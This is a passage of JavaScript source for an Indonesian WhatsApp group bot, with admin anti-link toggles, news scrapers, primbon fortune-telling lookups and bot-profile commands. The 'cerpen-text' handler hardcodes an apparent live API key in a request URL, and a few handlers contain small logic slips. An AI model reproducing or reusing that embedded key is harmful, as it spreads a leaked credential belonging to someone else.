fs.writeFileSync('./database/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktiktok': case 'antilinktt': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('_Sudah Diaktifkan_')
ntilinktt.push(from)
fs.writeFileSync('./database/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinktwt.push(from)
fs.writeFileSync('./database/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//

// jangan hapus : wm rul
case 'viewonce': {
    if (banned.includes(m.sender)) return;
    if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
    if (!m.isGroup) return reply(`Fitur ini hanya dapat digunakan di grup.`);
    if (!(isAdmins || isCreator)) return reply(mess.admin);
    if (args[0] === "on") {
        viewOnceMediaGroup[m.chat] = true;
        reply(`Fitur media sekali lihat diaktifkan untuk grup ini!`);
    } else if (args[0] === "off") {
        viewOnceMediaGroup[m.chat] = false;
        reply(`Fitur media sekali lihat dinonaktifkan untuk grup ini!`);
    } else {
        reply(`Penggunaan: ${prefix}viewonce on/off`);
    }
    break;
}
case 'antimedia': {
    if (banned.includes(m.sender)) return;
    if (!m.isGroup) return reply(`Fitur ini hanya dapat digunakan di grup.`);
    if (!(isAdmins || isCreator)) return reply(mess.admin);
    
    if (args[0] === "on") {
        antiMediaGroup[m.chat] = true;
        reply(`Fitur anti stiker, gambar, video, dan audio diaktifkan untuk grup ini!`);
    } else if (args[0] === "off") {
        antiMediaGroup[m.chat] = false;
        reply(`Fitur anti stiker, gambar, video, dan audio dinonaktifkan untuk grup ini!`);
    } else {
        reply(`Penggunaan: ${prefix}antimedia on/off`);
    }
    break;
}
case 'antinsfw': {
    if (banned.includes(m.sender)) return;
    if (!m.isGroup) return reply(`Fitur ini hanya dapat digunakan di grup.`);
    if (!(isAdmins || isCreator)) return reply(mess.admin);

    if (args[0] === "on") {
        antiNsfwGroup[m.chat] = true;
        reply(`Fitur anti-NSFW diaktifkan untuk group ini!`);
    } else if (args[0] === "off") {
        antiNsfwGroup[m.chat] = false;
        reply(`Fitur anti-NSFW dinonaktifkan untuk grup ini!`);
    } else {
        reply(`Penggunaan: ${prefix}antinsfw on/off`);
    }
    break;
}
case 'antilinkall': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinkall.push(from)
fs.writeFileSync('./database/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//

//=================================================//
case "antiasing":{
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiAsing) return m.reply('_Sudah Diaktifkan_')
ntasing.push(from)
fs.writeFileSync('./database/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return m.reply('_Sudah Dimatikan_')
let off = ntasing.indexOf(from)
ntasing.splice(off, 1)
fs.writeFileSync('./database/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antiwame': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiWame) return m.reply('_Sudah Diaktifkan_')
ntwame.push(from)
fs.writeFileSync('./database/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiWame) return m.reply('_Sudah Dimatikan_')
let off = ntwame.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses matikan ${command} di group ini_`)
}
}
break
case 'fajar':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'cnn-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tribun-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'indozone-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'kompas-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'detik-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'daily-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'inews-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'sindo-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'antara-news':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "kontan-news":
if (banned.includes(m.sender)) {
    return;
    }
await loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "merdeka-news":
if (banned.includes(m.sender)) {
    return;
    }
await loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "jalantikus-news":
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
KhaerulZx.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//=================================================
 case 'tafsirmimpi': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} Finsii, 7, 7, 2003, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA Hw`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} Finsii, 7, 7, 2003`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'artitarot': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} Finsii, 7, 7, 2003`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'masasubur': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak-cek': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio-cek': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================
case 'cerpen-text':
if (banned.includes(m.sender)) {
    return;
    }
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=06e2ad993927b9c0779dfd31`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
//=================================================
case 'ceritahoror-text':
if (banned.includes(m.sender)) {
    return;
    }
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
KhaerulZx.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
//=================================================
case 'apksearch': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await KhaerulZx.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
case 'readmore': {
    if (banned.includes(m.sender)) {
        return;
    }
    let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    
    // Definisikan variabel readmore dengan simbol Unicode
    const readmore = '\u200B'.repeat(4000);  // Tambahkan lebih dari 4000 karakter pemisah
    
    KhaerulZx.sendMessage(m.chat, { text: l + readmore + r }, { quoted: m });
}
break;
   case 'setbiobot':{
   if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Khusus Finsii`)
if (!text) return reply(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await kyu.updateProfileStatus(text)
    reply(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
if (!isAdmins) return reply(`Khusus admin`)
if (!isBotAdmins) return reply(`Jadikan Finsii Admin Dulu`)
    await KhaerulZx.removeProfilePicture(from)
    }
    break
